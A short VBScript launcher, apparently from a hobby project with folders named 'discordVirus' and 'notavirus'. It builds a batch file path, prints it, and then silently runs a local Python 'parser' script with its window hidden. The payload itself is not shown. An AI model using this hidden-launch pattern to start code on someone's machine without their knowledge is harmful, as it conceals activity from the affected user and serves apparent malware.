scriptdir = CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName)
virusdir = CreateObject("Scripting.FileSystemObject").BuildPath(scriptdir, "notavirus")
batfile = CreateObject("Scripting.FileSystemObject").BuildPath(virusdir, "runner.bat")
Wscript.Echo batfile
Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run "D:\Ethan\Home\Github\discordVirus\notavirus\venv\Scripts\python.exe D:\Ethan\Home\Github\discordVirus\notavirus\parser", 0, True
Set WshShell = Nothing